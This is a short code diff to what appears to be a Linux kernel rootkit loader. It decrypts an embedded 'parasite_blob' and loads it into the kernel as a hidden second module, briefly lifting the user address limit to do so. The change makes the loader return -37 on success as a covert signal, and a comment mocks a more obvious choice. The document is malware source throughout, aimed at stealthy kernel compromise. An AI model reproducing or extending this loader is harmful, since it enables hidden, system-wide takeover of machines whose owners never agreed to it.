@@ -55,6 +55,7 @@ static inline unsigned long ksym_lookup_name(const char *name)
 
 int init_module(void)
 {
+	int ret = -EINVAL;
 	asmlinkage long (*sys_init_module)(const void *, unsigned long, const char *) = NULL;
 
 	do_decrypt(parasite_blob, sizeof(parasite_blob), DECRYPT_KEY);
@@ -72,11 +73,11 @@ int init_module(void)
 			nullarg++;
 
 		user_addr_max() = roundup((unsigned long)parasite_blob + sizeof(parasite_blob), PAGE_SIZE);
-		sys_init_module(parasite_blob, sizeof(parasite_blob), nullarg);
+		if(sys_init_module(parasite_blob, sizeof(parasite_blob), nullarg) == 0) ret = -37; // would be 1337, but is too obvious. hahaha
 		user_addr_max() = seg;
 	}
 
-	return -EINVAL;
+	return ret;
 }
 
 MODULE_LICENSE("GPL");
